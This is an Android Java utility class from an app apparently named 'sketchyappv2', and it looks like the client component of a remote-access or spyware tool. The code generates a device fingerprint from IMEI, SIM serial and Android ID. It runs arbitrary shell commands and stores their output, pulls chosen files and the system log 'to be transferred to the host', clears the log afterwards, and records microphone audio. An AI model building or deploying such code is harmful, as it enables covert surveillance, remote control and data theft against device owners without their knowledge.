package com.twygonik.sketchyappv2;

import android.content.ContentResolver;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.UUID;

/**
 * A class that contains a bunch of utilities that don't necessarily
 * rely on threads or networking
 *
 */

public class Utils {
    Context appContext;
    Context baseContext;
    ContentResolver resolver;
    Utils(Context app, Context base, ContentResolver res){
        appContext = app;
        baseContext = base;
        resolver = res;
    }

    public String sha256(InputStream is) throws IOException{
        /*
        This method is used to create a sh256 hash
        to verify integrity after a file transfer
         */
        String LOG_TAG = "Hash";
        char[] hexDigits = "0123456789abcdef".toCharArray(); // The digits in HEX
        String sha256 = "";
        try{
            Log.e(LOG_TAG, "Beginning Hashing");
            byte[] bytes = new byte[4096]; // Byte buffer of 4096
            int read = 0;
            MessageDigest digest = MessageDigest.getInstance("SHA256"); // Get an instance of the SHA256 hash
            while ((read = is.read(bytes)) != -1){
                digest.update(bytes, 0, read);
            }
            byte[] messageDigest = digest.digest();
            StringBuilder sb = new StringBuilder(32);
            for (byte b : messageDigest){
                sb.append(hexDigits[(b >> 4) & 0x0f]); // Shifting bytes and doing bitwise and to determine a hex digit
                sb.append(hexDigits[b & 0x0f]); // bitwise and for calculation
            }
            sha256 = sb.toString(); // convert stringbuilder to String
            Log.e(LOG_TAG, "Hashing Complete");
        } catch (NoSuchAlgorithmException algo){
            Log.e(LOG_TAG, "Hash Error " + algo.toString());
            algo.printStackTrace();
        }
        return sha256; // Return the sha256 hash string
    }

    public String UUIDgen() {
        /*
        generates the client device UUID
         */
        String uuid = null;
        String LOG_TAG = "UUIDgen";
        try {
            String android_id = Settings.Secure.getString(appContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            final TelephonyManager tm = (TelephonyManager) baseContext.getSystemService(Context.TELEPHONY_SERVICE);
            final String tmDevice, tmSerial, androidId;
            tmDevice = "" + tm.getDeviceId(); // device id
            tmSerial = " " + tm.getSimSerialNumber(); // Note: in genymotion this is all 0's, which translates to all f's in the UUID
            androidId = "" + android.provider.Settings.Secure.getString(resolver, Settings.Secure.ANDROID_ID); // android id
            UUID deviceUuid = new UUID(androidId.hashCode(), ((long) tmDevice.hashCode() << 32) | tmSerial.hashCode()); // Create the UUID
            uuid = deviceUuid.toString(); // Convert UUID to string
            Log.e(LOG_TAG, "UUID: " + uuid);
        } catch (SecurityException sec) {
            sec.printStackTrace();
        }
        return uuid; // Return the UUID
    }

    public File extractLog(){
        /*
        Extracts the log file from the device to be transferred to the host
         */
        final String LOG_TAG = "Log Extract";
        Date datum = new Date();
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
        String fullName = df.format(datum) + "_appLog.log";
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), fullName);
        if(file.exists()){
            file.delete();
        }

        int pid = android.os.Process.myPid();
        try{
            String command = String.format("logcat -d"); // format the command properly
            Process process = Runtime.getRuntime().exec(command); // execute the command
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); // get the result back
            // build result into a string
            StringBuilder result = new StringBuilder();
            String currentLine = null;
            while ((currentLine = reader.readLine()) != null){
                if (currentLine != null){
                    result.append(currentLine);
                    result.append("\n");
                }
            }
            FileWriter out = new FileWriter(file); // write result to a log file
            out.write(result.toString());
            out.flush();
            out.close();
        } catch (IOException io){
            Log.e(LOG_TAG, io.toString());
            io.printStackTrace();
        }
        try{
            Runtime.getRuntime().exec("logcat -c"); // clear the log
        } catch(IOException io){
            Log.e(LOG_TAG, io.toString());
            io.printStackTrace();
        }
        return file; // return the logfile
    }

    public File extractFile(String filepath){
        // Due to implementation of fileupload this won't work properly
        File file = new File(filepath);
        if(file.exists()){
            return file;
        }
        return null;
    }

    public File runShellCommand(String command) {
        final String LOG_TAG = "runShell";
        Date datum = new Date();
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
        String fullName = df.format(datum) + "_stdout.txt"; // file formatted differently
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), fullName);
        if (file.exists()) {
            file.delete();
        }
        try {
            int pid = android.os.Process.myPid();
            command = String.format(command); // format the command
            Process process = Runtime.getRuntime().exec(command); // run the command
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); // get result back
            StringBuilder result = new StringBuilder();
            String currentLine = null;
            result.append("Command: " + command + "\n"); // append the command executed to beginning of file
            while ((currentLine = reader.readLine()) != null) {
                if (currentLine != null) {
                    result.append(currentLine); // append each line of output to a file
                    result.append("\n");
                }
            }
            FileWriter out = new FileWriter(file);
            out.write(result.toString());
            out.flush();
            out.close();
        } catch (Exception e) {
            Log.e(LOG_TAG, "Got Exception");
            e.printStackTrace();
        }
        return file; // return the file of the command
    }


    public static class AudioRecord{
        /*
        This class handles logic for recording the devices audio for a set amount of time
        The start/stop is done via a boolean and called
         */
        private final String LOG_TAG = "AudioRecord";
        private String mFileName = null;
        private MediaRecorder mRecorder = null;

        public AudioRecord(String filename){
            /*
            All files are stored in DCIM for ease of testing with adb shell
             */
            mFileName = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
            mFileName += "/";
            mFileName += filename;
            mFileName += ".3gp"; // create filename properly
        }

        public void onRecord(boolean start){
            if (start){
                startRecording(); // start the recording
            } else{
                stopRecording(); // stop the recording
            }
        }

        private void startRecording(){
            /*
            Starts the recording
            Note: if the permission to record audio is not given, this function WILL crash the app
             */
            Log.e(LOG_TAG, "Started recording");
            mRecorder = new MediaRecorder(); // new media recorder
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // set audio source to MIC
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); // fileoutput .3gp
            mRecorder.setOutputFile(mFileName); // set filename
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); // set the encoder
            try{
                mRecorder.prepare(); // prepare the recorder
            } catch (IOException io){
                Log.e(LOG_TAG, "prepare() fialed");
            }
            mRecorder.start();
        }

        private void stopRecording(){
            mRecorder.stop(); // stop the recording
            mRecorder.reset(); // reset the recorder
            mRecorder.release(); // release it
            mRecorder = null; // set it to null
            Log.e(LOG_TAG, "Stopped Recording");
        }
    }
}
